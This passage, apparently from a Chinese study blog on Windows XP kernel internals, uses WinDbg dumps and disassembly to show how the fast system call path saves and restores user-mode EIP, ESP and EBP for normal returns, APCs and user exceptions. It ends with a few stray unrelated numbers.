<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br><span class="line"><span class="number">8003f</span>030  ffc093df`f0000001 <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">8003f</span>040  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>



<p>1、需要解释下快速调用缺少的如下在<code>KiSystemService</code>的两句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+_KTRAP_FRAME._Edx], ebx</span><br></pre></td></tr></table></figure>

<p>2、快速调用返回函数<code>KiFastSystemCallRet</code>是紧跟在<code>KiFastSystemCall</code>之后的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x7c92e4f0</span></span><br><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">0x7c92e4f4</span></span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br><span class="line"><span class="number">7</span>c92e507 <span class="number">90</span>              nop</span><br><span class="line">ntdll!RtlRaiseException:</span><br><span class="line"><span class="number">7</span>c92e508 <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>

<p>3、好好解释一下快速返回<code>KiFastSystemCallRet</code>的<code>ret</code>实际就是弹出<code>NtReadVirtualMemory</code>的返回地址去执行。</p>
<p><img data-src="https://s2.loli.net/2022/07/24/Ubly9KWi4u8sAN3.png" alt="53.png"></p>
<h3 id="6-3-0环的返回3环寄存器"><a href="#6-3-0环的返回3环寄存器" class="headerlink" title="6.3 0环的返回3环寄存器"></a>6.3 0环的返回3环寄存器</h3><p>从0环返回三环，最重要的是找到 <strong>EIP3</strong>、<strong>ESP3</strong>、<strong>EBP3</strong>的位置。</p>
<p>两种返回方式：<strong>iretd</strong>、<strong>sysexit</strong>。</p>
<ol>
<li><mark class="label danger">常规方式</mark> ：系统调用返回

<ul>
<li><p><strong>进入0环时</strong></p>
<ul>
<li><p>ESP3：TRAP_FRAME.HardwareSegEsp &#x3D;  edx，第二个返回地址（KiFastCallEntry）</p>
</li>
<li><p>EIP3：KTRAP_FRAME.Eip &#x3D; _KUSER_SHARED_DATA.SystemCallReturn（KiFastCallEntry）</p>
</li>
<li><p>EBP3：TRAP_FRAME.Ebp &#x3D; ebp （KiFastCallEntry）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A539		push edx		<span class="comment">//HardwareSegEsp = esp3 == 3环的第二个返回地址</span></span><br><span class="line">...<span class="comment">//eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A548		push dword ptr ds:<span class="number">0F</span>FDF0304h</span><br><span class="line">...<span class="comment">//ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A550		push ebp</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>退出0环时</strong></p>
<ul>
<li><p>ESP3：ecx</p>
</li>
<li><p>EIP3：edx</p>
</li>
<li><p>EBP3：ebp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//KiSystemCallExit2</span></span><br><span class="line">.text:<span class="number">0046</span>A732		pop ecx		<span class="comment">//ecx = TrapFrame.HardwareSegEsp, sysexit --&gt; esp3 = ecx</span></span><br><span class="line">...<span class="comment">//KiSystemCallExit2</span></span><br><span class="line">.text:<span class="number">0046</span>A728		pop edx		<span class="comment">//edx = TrapFrame.Eip, sysexit --&gt; eip3 = edx</span></span><br><span class="line">...<span class="comment">//KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A700		pop ebp		<span class="comment">//ebp = TrapFrame.Ebp, sysexit 不改变Ebp</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><mark class="label success">APC返回</mark>

<ul>
<li><strong>进入0环时</strong>：使用常规调用</li>
<li><strong>退出0环前</strong>：在执行到常规退出之前，修改TrapFrame<ul>
<li>ESP3：在<code>KiFastSystemCallRet</code>函数里构造<code>sizeof(CONTEXT) + 0x10 == 0x2DC</code>，然后将这时3环的地址赋给TrapFrame.HardwareSegEsp（KiInitializeUserApc）。</li>
<li>EIP3：TrapFrame.Eip &#x3D; KeUserApcDispatcher（KiInitializeUserApc）。</li>
<li>EBP3：在KiInitializeUserApc中没有处理，使用默认值。</li>
</ul>
</li>
<li><strong>退出0环时</strong>：使用常规调用</li>
</ul>
</li>
<li><mark class="label primary">用户异常返回</mark>（使用sysenter方式，非中断进入0环）

<ul>
<li><strong>进入0环时</strong>：使用常规调用</li>
<li><strong>退出0环前</strong>：在执行到常规退出之前，修改TrapFrame<ul>
<li>ESP3：在<code>KiDispatchException--KiEspToTrapFrame</code>函数里赋值给TrapFrame.HardwareSegEsp，此时的Eip3指向<code>KiUserExceptionDispatcher</code>函数的栈顶（参数1、2，EXCEPTION_RECORD，CONTEXT）。</li>
<li>EIP3：TrapFrame.Eip &#x3D; KeUserExceptionDispatcher（KiDispatchException）。</li>
<li>EBP3：在KiDispatchException中没有处理，使用默认值。</li>
</ul>
</li>
<li><strong>退出0环时</strong>：使用常规调用</li>
</ul>
</li>
</ol>
<h2 id="7-API前缀"><a href="#7-API前缀" class="headerlink" title="7 API前缀"></a>7 API前缀</h2><p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<p>21      22     23   24   25   26 年</p>
<p>25     26      27   28   29   30</p>
<p>b-      b-      b-     b     b-    b-</p>
<p>​         15              20            30     </p>
<p>45 60</p>
<p>20*1.3 &#x3D; 26</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>API调用</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>系统调用</tag>
        <tag>API调用</tag>
      </tags>
  </entry>
</search>
